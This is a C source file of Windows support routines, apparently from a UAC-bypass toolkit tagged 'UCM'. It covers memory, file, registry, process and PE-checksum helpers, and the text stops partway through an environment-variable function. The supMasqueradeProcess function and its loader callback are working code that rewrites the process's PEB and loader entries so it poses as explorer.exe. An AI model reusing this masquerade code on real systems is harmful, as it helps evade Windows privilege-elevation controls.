/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2020
*
*  TITLE:       SUP.C
*
*  VERSION:     3.52
*
*  DATE:        28 Oct 2020
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* supEncodePointer
*
* Purpose:
*
* Encodes the specified pointer.
*
*/
PVOID supEncodePointer(
    _In_ PVOID Pointer)
{
    NTSTATUS Status;
    ULONG Cookie, retLength;

    if ((g_ctx == NULL) || (g_ctx->Cookie == 0)) {

        Status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessCookie,
            &Cookie,
            sizeof(ULONG),
            &retLength);

        if (!NT_SUCCESS(Status))
            RtlRaiseStatus(Status);

        if (g_ctx)
            g_ctx->Cookie = Cookie;

    }
    else {
        Cookie = g_ctx->Cookie;
    }

#ifdef _WIN64
    return (PVOID)(RotateRight64(
        (ULONG_PTR)Pointer ^ Cookie,
        Cookie & 0x3f));
#else
    return (PVOID)(RotateRight32(
        (ULONG_PTR)Pointer ^ Cookie,
        Cookie & 0x1f));
#endif
}

/*
* supDecodePointer
*
* Purpose:
*
* Decodes the specified pointer.
*
*/
PVOID supDecodePointer(
    _In_ PVOID Pointer)
{
    NTSTATUS Status;
    ULONG Cookie, retLength;

    if ((g_ctx == NULL) || (g_ctx->Cookie == 0)) {

        Status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessCookie,
            &Cookie,
            sizeof(ULONG),
            &retLength);

        if (!NT_SUCCESS(Status))
            RtlRaiseStatus(Status);

        if (g_ctx)
            g_ctx->Cookie = Cookie;

    }
    else {
        Cookie = g_ctx->Cookie;
    }

#ifdef _WIN64
    return (PVOID)(RotateRight64(
        (ULONG_PTR)Pointer,
        0x40 - (Cookie & 0x3f)) ^ Cookie);
#else
    return (PVOID)(RotateRight32(
        (ULONG_PTR)Pointer,
        0x20 - (Cookie & 0x1f)) ^ Cookie);
#endif
}

/*
* supVirtualAlloc
*
* Purpose:
*
* Wrapper for NtAllocateVirtualMemory.
*
*/
PVOID supVirtualAlloc(
    _Inout_ PSIZE_T Size,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect,
    _Out_opt_ NTSTATUS *Status)
{
    NTSTATUS status;
    PVOID Buffer = NULL;
    SIZE_T size;

    size = *Size;

    status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &Buffer,
        0,
        &size,
        AllocationType,
        Protect);

    if (NT_SUCCESS(status)) {
        RtlSecureZeroMemory(Buffer, size);
    }

    *Size = size;
    if (Status) *Status = status;

    return Buffer;
}

/*
* supVirtualFree
*
* Purpose:
*
* Wrapper for NtFreeVirtualMemory.
*
*/
BOOL supVirtualFree(
    _In_ PVOID Memory,
    _Out_opt_ NTSTATUS *Status)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0;

    status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &Memory,
        &size,
        MEM_RELEASE);

    if (Status) *Status = status;

    return NT_SUCCESS(status);
}

/*
* supSecureVirtualFree
*
* Purpose:
*
* Wrapper for NtFreeVirtualMemory.
*
*/
BOOL supSecureVirtualFree(
    _In_ PVOID Memory,
    _In_ SIZE_T MemorySize,
    _Out_opt_ NTSTATUS *Status)
{
    RtlSecureZeroMemory(Memory, MemorySize);
    return supVirtualFree(Memory, Status);
}

/*
* supHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap with ucmHeap.
*
*/
PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size)
{
    return RtlAllocateHeap(g_ctx->ucmHeap, HEAP_ZERO_MEMORY, Size);
}

/*
* supHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap with ucmHeap.
*
*/
BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory)
{
    return RtlFreeHeap(g_ctx->ucmHeap, 0, Memory);
}

/*
* supIsProcess32bit
*
* Purpose:
*
* Return TRUE if given process is under WOW64, FALSE otherwise.
*
*/
BOOLEAN supIsProcess32bit(
    _In_ HANDLE hProcess
)
{
    NTSTATUS status;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;

    if (hProcess == NULL) {
        return FALSE;
    }

    //query if this is wow64 process
    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
    if (NT_SUCCESS(status)) {
        return (pebi.IsWow64Process == 1);
    }
    return FALSE;
}

/*
* supGetElevationType
*
* Purpose:
*
* Returns client elevation type.
*
*/
BOOL supGetElevationType(
    _Out_ TOKEN_ELEVATION_TYPE *lpType
)
{
    HANDLE hToken = NULL;
    NTSTATUS status;
    ULONG bytesRead = 0;
    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;

    status = NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if (NT_SUCCESS(status)) {

        status = NtQueryInformationToken(hToken, TokenElevationType, &TokenType,
            sizeof(TOKEN_ELEVATION_TYPE), &bytesRead);

        NtClose(hToken);
    }

    supSetLastErrorFromNtStatus(status);

    if (lpType)
        *lpType = TokenType;

    return (NT_SUCCESS(status));
}

/*
* supWriteBufferToFile
*
* Purpose:
*
* Create new file and write buffer to it.
*
*/
BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_opt_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO = 0;

    if ((Buffer == NULL) || (BufferSize == 0))
        return FALSE;

    hFile = CreateFile(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
        CloseHandle(hFile);
    }
    else {
#ifdef _DEBUG
        supDebugPrint(TEXT("CreateFile"), GetLastError());
#endif
        return FALSE;
    }

    return (bytesIO == BufferSize);
}

/*
* supDebugPrint
*
* Purpose:
*
* Write formatted debug output.
*
*/
VOID supDebugPrint(
    _In_ LPWSTR ApiName,
    _In_ DWORD status
)
{
    HANDLE Heap;
    LPWSTR lpBuffer;
    SIZE_T sz;

    sz = MAX_PATH;
    if (ApiName)
        sz += _strlen(ApiName);

    if (g_ctx == NULL) {
        Heap = NtCurrentPeb()->ProcessHeap;
    }
    else {
        Heap = g_ctx->ucmHeap;
    }

    lpBuffer = (LPWSTR)RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, sz * sizeof(WCHAR));
    if (lpBuffer) {
        _strcpy(lpBuffer, TEXT("[UCM] "));
        if (ApiName) {
            _strcat(lpBuffer, ApiName);
        }
        _strcat(lpBuffer, TEXT(" code = 0x"));
        ultohex(status, _strend(lpBuffer));
        _strcat(lpBuffer, TEXT("\n"));
        OutputDebugString(lpBuffer);
        RtlFreeHeap(Heap, 0, lpBuffer);
    }

}

/*
* supRegWriteValue
*
* Purpose:
*
* Write value to the registry.
*
*/
NTSTATUS supRegWriteValue(
    _In_ HANDLE hKey,
    _In_opt_ LPWSTR ValueName,
    _In_ DWORD ValueType,
    _In_ PVOID ValueData,
    _In_ ULONG ValueDataSize
)
{
    UNICODE_STRING usValue;

    if (ValueName) {

        RtlInitUnicodeString(&usValue, ValueName);

    }
    else {

        RtlInitEmptyUnicodeString(&usValue, NULL, 0);

    }

    return NtSetValueKey(hKey,
        &usValue,
        0,
        ValueType,
        ValueData,
        ValueDataSize);
}

/*
* supRegReadValue
*
* Purpose:
*
* Read given value to output buffer.
* Returned Buffer must be released with RtlFreeHeap after use.
*
*/
NTSTATUS supRegReadValue(
    _In_ HANDLE hKey,
    _In_ LPWSTR ValueName,
    _In_ DWORD ValueType,
    _Out_ PVOID *Buffer,
    _Out_ ULONG *BufferSize,
    _In_opt_ HANDLE hHeap
)
{
    KEY_VALUE_PARTIAL_INFORMATION *kvpi;
    UNICODE_STRING usName;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    ULONG Length = 0;
    PVOID CopyBuffer = NULL;
    HANDLE Heap;

    *Buffer = NULL;
    *BufferSize = 0;

    if (hHeap == NULL)
        Heap = NtCurrentPeb()->ProcessHeap;
    else
        Heap = hHeap;

    RtlInitUnicodeString(&usName, ValueName);
    Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, NULL, 0, &Length);
    if (Status == STATUS_BUFFER_TOO_SMALL) {

        kvpi = (KEY_VALUE_PARTIAL_INFORMATION *)RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, Length);
        if (kvpi) {

            Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, kvpi, Length, &Length);
            if (NT_SUCCESS(Status)) {

                if (kvpi->Type == ValueType) {

                    CopyBuffer = RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, kvpi->DataLength);
                    if (CopyBuffer) {
                        RtlCopyMemory(CopyBuffer, kvpi->Data, kvpi->DataLength);
                        *Buffer = CopyBuffer;
                        *BufferSize = kvpi->DataLength;
                        Status = STATUS_SUCCESS;
                    }
                    else {
                        Status = STATUS_NO_MEMORY;
                    }
                }
                else {
                    Status = STATUS_OBJECT_TYPE_MISMATCH;
                }
            }
            RtlFreeHeap(Heap, 0, kvpi);
        }
        else {
            Status = STATUS_NO_MEMORY;
        }
    }

    return Status;
}

/*
* supReadFileToBuffer
*
* Purpose:
*
* Read file to buffer. Release memory when it no longer needed.
*
*/
PBYTE supReadFileToBuffer(
    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize
)
{
    NTSTATUS    status;
    HANDLE      hFile = NULL;
    PBYTE       Buffer = NULL;
    SIZE_T      sz = 0;

    UNICODE_STRING              usName;
    OBJECT_ATTRIBUTES           attr;
    IO_STATUS_BLOCK             iost;
    FILE_STANDARD_INFORMATION   fi;

    do {

        if (lpFileName == NULL)
            return NULL;

        if (!RtlDosPathNameToNtPathName_U(lpFileName, &usName, NULL, NULL))
            break;

        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);

        status = NtCreateFile(
            &hFile,
            FILE_READ_DATA | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);

        RtlFreeUnicodeString(&usName);

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlSecureZeroMemory(&fi, sizeof(fi));

        status = NtQueryInformationFile(
            hFile,
            &iost,
            &fi,
            sizeof(FILE_STANDARD_INFORMATION),
            FileStandardInformation);

        if (!NT_SUCCESS(status))
            break;

        sz = (SIZE_T)fi.EndOfFile.LowPart;

        Buffer = (PBYTE)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            &status);

        if (NT_SUCCESS(status)) {

            status = NtReadFile(
                hFile,
                NULL,
                NULL,
                NULL,
                &iost,
                Buffer,
                fi.EndOfFile.LowPart,
                NULL,
                NULL);

            if (NT_SUCCESS(status)) {
                if (lpBufferSize)
                    *lpBufferSize = fi.EndOfFile.LowPart;
            }
            else {
                supVirtualFree(Buffer, NULL);
                Buffer = NULL;
            }
        }

    } while (FALSE);

    if (hFile != NULL) {
        NtClose(hFile);
    }

    return Buffer;
}

/*
* supRunProcess2
*
* Purpose:
*
* Execute given process with given parameters and wait if specified.
*
*/
BOOL supRunProcess2(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpVerb,
    _In_ INT nShow,
    _In_ ULONG mTimeOut
)
{
    BOOL bResult;
    SHELLEXECUTEINFO shinfo;

    if (lpszProcessName == NULL)
        return FALSE;

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpFile = lpszProcessName;
    shinfo.lpParameters = lpszParameters;
    shinfo.nShow = nShow;
    shinfo.lpVerb = lpVerb;
    bResult = ShellExecuteEx(&shinfo);
    if (bResult) {
        if (mTimeOut != 0) {
            if (WaitForSingleObject(shinfo.hProcess, mTimeOut) == WAIT_TIMEOUT)
                TerminateProcess(shinfo.hProcess, WAIT_TIMEOUT);
        }
        CloseHandle(shinfo.hProcess);
    }
    return bResult;
}

/*
* supRunProcess
*
* Purpose:
*
* Execute given process with given parameters.
*
*/
BOOL supRunProcess(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters
)
{
    return supRunProcess2(lpszProcessName, 
        lpszParameters, 
        NULL, 
        SW_SHOW, 
        SUPRUNPROCESS_TIMEOUT_DEFAULT);
}

/*
* supCopyMemory
*
* Purpose:
*
* Copies bytes between buffers.
*
* dest - Destination buffer
* cbdest - Destination buffer size in bytes
* src - Source buffer
* cbsrc - Source buffer size in bytes
*
*/
void supCopyMemory(
    _Inout_ void *dest,
    _In_ size_t cbdest,
    _In_ const void *src,
    _In_ size_t cbsrc
)
{
    char *d = (char*)dest;
    char *s = (char*)src;

    if ((dest == 0) || (src == 0) || (cbdest == 0))
        return;
    if (cbdest < cbsrc)
        cbsrc = cbdest;

    while (cbsrc > 0) {
        *d++ = *s++;
        cbsrc--;
    }
}

/*
* supQueryEnvironmentVariableOffset
*
* Purpose:
*
* Return offset to the given environment variable.
*
*/
LPWSTR supQueryEnvironmentVariableOffset(
    _In_ PUNICODE_STRING Value
)
{
    UNICODE_STRING   str1;
    PWCHAR           EnvironmentBlock, ptr;

    EnvironmentBlock = (PWCHAR)RtlGetCurrentPeb()->ProcessParameters->Environment;
    ptr = EnvironmentBlock;

    do {
        if (*ptr == 0)
            return 0;

        RtlInitUnicodeString(&str1, ptr);
        if (RtlPrefixUnicodeString(Value, &str1, TRUE))
            break;

        ptr += _strlen(ptr) + 1;

    } while (1);

    return (ptr + Value->Length / sizeof(WCHAR));
}

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
)
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supCalculateCheckSumForMappedFile
*
* Purpose:
*
* Calculate PE file checksum.
*
*/
DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG CheckSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return CheckSum;
}

/*
* supVerifyMappedImageMatchesChecksum
*
* Purpose:
*
* Calculate PE file checksum and compare it with checksum in PE header.
*
*/
BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PIMAGE_NT_HEADERS NtHeaders;
    ULONG HeaderSum;
    ULONG CheckSum;

    CheckSum = supCalculateCheckSumForMappedFile(BaseAddress, FileLength);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        HeaderSum = NtHeaders->OptionalHeader.CheckSum;
    }
    else {
        HeaderSum = FileLength;
    }
    return (CheckSum == HeaderSum);
}

/*
* supSetCheckSumForMappedFile
*
* Purpose:
*
* Set checksum value to PE header.
*
*/
BOOLEAN supSetCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG CheckSum
)
{
    PIMAGE_NT_HEADERS NtHeaders;

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        NtHeaders->OptionalHeader.CheckSum = CheckSum;
        return TRUE;
    }
    return FALSE;
}

/*
* ucmxBuildVersionString
*
* Purpose:
*
* Combine version numbers into string.
*
*/
VOID ucmxBuildVersionString(
    _In_ WCHAR *pszVersion)
{
    WCHAR szShortName[64];

    RtlSecureZeroMemory(&szShortName, sizeof(szShortName));
    DecodeStringById(ISDB_PROGRAMNAME, (LPWSTR)&szShortName, sizeof(szShortName));

    wsprintf(pszVersion, TEXT("%s v %lu.%lu.%lu.%lu"),
        szShortName,
        UCM_VERSION_MAJOR,
        UCM_VERSION_MINOR,
        UCM_VERSION_REVISION,
        UCM_VERSION_BUILD);
}

/*
* ucmShowMessage
*
* Purpose:
*
* Output message to user by message id.
*
*/
VOID ucmShowMessageById(
    _In_ BOOL OutputToDebugger,
    _In_ ULONG MessageId
)
{
    PWCHAR pszMessage;
    SIZE_T allocSize = PAGE_SIZE;

    pszMessage = supVirtualAlloc(&allocSize,
        DEFAULT_ALLOCATION_TYPE, 
        DEFAULT_PROTECT_TYPE, NULL);
    if (pszMessage) {

        if (DecodeStringById(MessageId, pszMessage, PAGE_SIZE/sizeof(WCHAR))) {
            ucmShowMessage(OutputToDebugger, pszMessage);
        }
        supSecureVirtualFree(pszMessage, PAGE_SIZE, NULL);
    }
}

/*
* ucmShowMessage
*
* Purpose:
*
* Output message to user.
*
*/
VOID ucmShowMessage(
    _In_ BOOL OutputToDebugger,
    _In_ LPWSTR lpszMsg
)
{
    WCHAR szVersion[100];

    if (OutputToDebugger) {
        OutputDebugString(lpszMsg);
        OutputDebugString(TEXT("\r\n"));
    }
    else {
        szVersion[0] = 0;
        ucmxBuildVersionString(szVersion);
        MessageBox(GetDesktopWindow(),
            lpszMsg,
            szVersion,
            MB_ICONINFORMATION);
    }
}

/*
* ucmShowQuestionById
*
* Purpose:
*
* Output message with question to user with given question id.
*
*/
INT ucmShowQuestionById(
    _In_ ULONG MessageId
)
{
    INT iResult = IDNO;
    WCHAR szVersion[100];
    PWCHAR pszMessage;
    SIZE_T allocSize = PAGE_SIZE;

    if (g_ctx->UserRequestsAutoApprove == TRUE)
        return IDYES;

    pszMessage = supVirtualAlloc(&allocSize,
        DEFAULT_ALLOCATION_TYPE,
        DEFAULT_PROTECT_TYPE, NULL);
    if (pszMessage) {

        if (DecodeStringById(MessageId, pszMessage, PAGE_SIZE / sizeof(WCHAR))) {
            
            szVersion[0] = 0;
            ucmxBuildVersionString(szVersion);

            iResult = MessageBox(GetDesktopWindow(),
                pszMessage,
                szVersion,
                MB_YESNO);

        }
        supSecureVirtualFree(pszMessage, PAGE_SIZE, NULL);
    }

    return iResult;
}

/*
* supLdrQueryResourceData
*
* Purpose:
*
* Load resource by given id (win32 FindResource, SizeofResource, LockResource).
*
*/
PBYTE supLdrQueryResourceData(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize
)
{
    NTSTATUS                   status;
    ULONG_PTR                  IdPath[3];
    IMAGE_RESOURCE_DATA_ENTRY  *DataEntry;
    PBYTE                      Data = NULL;
    ULONG                      SizeOfData = 0;

    if (DllHandle != NULL) {

        IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
        IdPath[1] = ResourceId;           //id
        IdPath[2] = 0;                    //lang

        status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
        if (NT_SUCCESS(status)) {
            status = LdrAccessResource(DllHandle, DataEntry, (PVOID*)&Data, &SizeOfData);
            if (NT_SUCCESS(status)) {
                if (DataSize) {
                    *DataSize = SizeOfData;
                }
            }
        }
    }
    return Data;
}

/*
* supSetLastErrorFromNtStatus
*
* Purpose:
*
* Convert last error.
*
*/
VOID supSetLastErrorFromNtStatus(
    _In_ NTSTATUS LastNtStatus
)
{
    DWORD dwErrorCode;
#ifdef _WIN64
    dwErrorCode = RtlNtStatusToDosErrorNoTeb(LastNtStatus);
#else
    dwErrorCode = RtlNtStatusToDosError(LastNtStatus);
#endif
    SetLastError(dwErrorCode);
}

static PWSTR g_lpszExplorer = NULL;

typedef struct _LDR_BACKUP {
    PWSTR ImagePathName;
    PWSTR CommandLine;
    PWSTR lpFullDllName;
    PWSTR lpBaseDllName;
} LDR_BACKUP, *PLDR_BACKUP;

static LDR_BACKUP g_LdrBackup;

/*
* supxLdrEnumModulesCallback
*
* Purpose:
*
* LdrEnumerateLoadedModules callback.
*
*/
VOID NTAPI supxLdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _Inout_ BOOLEAN *StopEnumeration
)
{
    PPEB Peb = NtCurrentPeb();
    PWSTR FullDllName, BaseDllName;

    BOOL Restore = PtrToInt(Context);

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {

        if (Restore) {
            FullDllName = g_LdrBackup.lpFullDllName;
            BaseDllName = g_LdrBackup.lpBaseDllName;
        }
        else {
            g_LdrBackup.lpBaseDllName = DataTableEntry->BaseDllName.Buffer;
            g_LdrBackup.lpFullDllName = DataTableEntry->FullDllName.Buffer;
            FullDllName = g_lpszExplorer;
            BaseDllName = EXPLORER_EXE;
        }

        RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);

        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

/*
* supMasqueradeProcess
*
* Purpose:
*
* Fake/Restore current process information.
*
*/
VOID supMasqueradeProcess(
    _In_ BOOL Restore
)
{
    NTSTATUS    Status;
    PPEB        Peb = NtCurrentPeb();
    SIZE_T      RegionSize;

    PWSTR ImageFileName, CommandLine;

    if (Restore == FALSE) {

        g_lpszExplorer = NULL;
        RegionSize = PAGE_SIZE;
        Status = NtAllocateVirtualMemory(
            NtCurrentProcess(),
            (PVOID*)&g_lpszExplorer,
            0,
            &RegionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (NT_SUCCESS(Status)) {
            _strcpy(g_lpszExplorer, g_ctx->szSystemRoot);
            _strcat(g_lpszExplorer, EXPLORER_EXE);
        }
        else {
            supSetLastErrorFromNtStatus(Status);
            return;
        }
    }

    RtlAcquirePebLock();

    if (Restore) {
        CommandLine = g_LdrBackup.CommandLine;
        ImageFileName = g_LdrBackup.ImagePathName;
    }
    else {
        g_LdrBackup.ImagePathName = Peb->ProcessParameters->ImagePathName.Buffer;
        g_LdrBackup.CommandLine = Peb->ProcessParameters->CommandLine.Buffer;

        ImageFileName = g_lpszExplorer;
        CommandLine = EXPLORER_EXE;
    }

    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);

    if (Restore) {

        RegionSize = 0;
        NtFreeVirtualMemory(
            NtCurrentProcess(),
            (PVOID*)&g_lpszExplorer,
            &RegionSize,
            MEM_RELEASE);

        g_lpszExplorer = NULL;

    }

    RtlReleasePebLock();

    LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, IntToPtr(Restore));
}

/*
* supExpandEnvironmentStrings
*
* Purpose:
*
* Native ExpandEnvironmetStrings.
*
*/
DWORD supExpandEnvironmentStrings(
    _In_ LPCWSTR lpSrc,
    _In_ LPWSTR lpDst,
    _In_ DWORD nSize
)
{
    NTSTATUS Status;
    UNICODE_STRING Source, Destination;
    ULONG Length;
    DWORD iSize;

    if (nSize > (MAXUSHORT >> 1) - 2) {
        iSize = (MAXUSHORT >> 1) - 2;
    }
    else {
        iSize = nSize;
    }

    RtlInitUnicodeString(&Source, lpSrc);
    Destination.Buffer = lpDst;
    Destination.Length = 0;
    Destination.MaximumLength = (USHORT)(iSize * sizeof(WCHAR));
    Length = 0;
    Status = RtlExpandEnvironmentStrings_U(NULL,
        &Source,
        &Destination,
        &Length
    );
    if (NT_SUCCESS(Status) || Status == STATUS_BUFFER_TOO_SMALL) {
        return (DWORD)(Length / sizeof(WCHAR));
    }
    else {
        supSetLastErrorFromNtStatus(Status);
        return 0;
    }
}

/*
* sxsFilePathNoSlash
*
* Purpose:
*
* same as _filepath except it doesnt return last slash.
*
*/
wchar_t *sxsFilePathNoSlash(
    const wchar_t *fname,
    wchar_t *fpath
)
{
    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;

    if ((fname == 0) || (fpath == NULL))
        return 0;

    while (*fname != (wchar_t)0) {
        if (*fname == '\\')
            p = (wchar_t *)fname;
        fname++;
    }

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

    return fpath;
}

/*
* sxsFindLoaderEntry
*
* Purpose:
*
* Return loader entry filename for sxs dll.
*
*/
BOOL sxsFindLoaderEntry(
    _In_ PSXS_SEARCH_CONTEXT Context
)
{
    NTSTATUS Status;
    HANDLE hDll = NULL;
    UNICODE_STRING usDll;

    PLDR_DATA_TABLE_ENTRY LdrTableEntry = NULL;

    RtlInitUnicodeString(&usDll, Context->DllName);

    Status = LdrGetDllHandle(
        NULL,
        NULL,
        &usDll,
        &hDll);

    if (NT_SUCCESS(Status)) {

        Status = LdrFindEntryForAddress(
            hDll,
            &LdrTableEntry);

        if (NT_SUCCESS(Status)) {

            if (_strstri(
                LdrTableEntry->FullDllName.Buffer,
                L".local") == NULL)
            {
                if (_strstri(
                    LdrTableEntry->FullDllName.Buffer,
                    Context->SxsKey))
                {
                    sxsFilePathNoSlash(
                        LdrTableEntry->FullDllName.Buffer,
                        Context->FullDllPath);

                }
                else
                    Status = STATUS_NOT_FOUND;
            }
            else
                Status = STATUS_TOO_LATE;
        }
    }

    return NT_SUCCESS(Status);
}

/*
* supxDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
*/
BOOL supxDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey)
{
    LPWSTR lpEnd;
    LONG lResult;
    DWORD dwSize;
    WCHAR szName[MAX_PATH + 1];
    HKEY hKey;
    FILETIME ftWrite;

    //
    // Attempt to delete key as is.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    //
    // Try to open key to check if it exist.
    //
    lResult = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        if (lResult == ERROR_FILE_NOT_FOUND)
            return TRUE;
        else
            return FALSE;
    }

    //
    // Add slash to the key path if not present.
    //
    lpEnd = _strend(lpSubKey);
    if (*(lpEnd - 1) != TEXT('\\')) {
        *lpEnd = TEXT('\\');
        lpEnd++;
        *lpEnd = TEXT('\0');
    }

    //
    // Enumerate subkeys and call this func for each.
    //
    dwSize = MAX_PATH;
    lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
        NULL, NULL, &ftWrite);

    if (lResult == ERROR_SUCCESS) {

        do {

            _strncpy(lpEnd, MAX_PATH, szName, MAX_PATH);

            if (!supxDeleteKeyRecursive(hKeyRoot, lpSubKey))
                break;

            dwSize = MAX_PATH;

            lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
                NULL, NULL, &ftWrite);

        } while (lResult == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = TEXT('\0');

    RegCloseKey(hKey);

    //
    // Delete current key, all it subkeys should be already removed.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    return FALSE;
}

/*
* supRegDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
* Remark:
*
* SubKey should not be longer than 260 chars.
*
*/
BOOL supRegDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey)
{
    WCHAR szKeyName[MAX_PATH * 2];
    RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));
    _strncpy(szKeyName, MAX_PATH * 2, lpSubKey, MAX_PATH);
    return supxDeleteKeyRecursive(hKeyRoot, szKeyName);
}

/*
* supSetEnvVariableEx
*
* Purpose:
*
* Remove or set current user environment variable (NTAPI variant).
*
*/
BOOL supSetEnvVariableEx(
    _In_ BOOL fRemove,
    _In_opt_ LPWSTR lpKeyName,
    _In_ LPWSTR lpVariableName,
    _In_opt_ LPWSTR lpVariableData
)
{
    BOOL        bNameAllocated = FALSE;
    DWORD       cbData;
    NTSTATUS    ntStatus = STATUS_UNSUCCESSFUL;
    LPWSTR      lpSubKey;
    HANDLE      hRoot = NULL, hSubKey = NULL;

    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usRootKey, usSubKey, usValueName;

    usRootKey.Buffer = NULL;

    do {
        if (lpVariableName == NULL) {
            //
            // Nothing to set/remove.
            //
            break;
        }

        if ((lpVariableData == NULL) && (fRemove == FALSE))
            break;

        if (lpKeyName == NULL)
            lpSubKey = L"Environment";
        else
            lpSubKey = lpKeyName;

        ntStatus = RtlFormatCurrentUserKeyPath(&usRootKey);
        if (!NT_SUCCESS(ntStatus))
            break;

        bNameAllocated = TRUE;

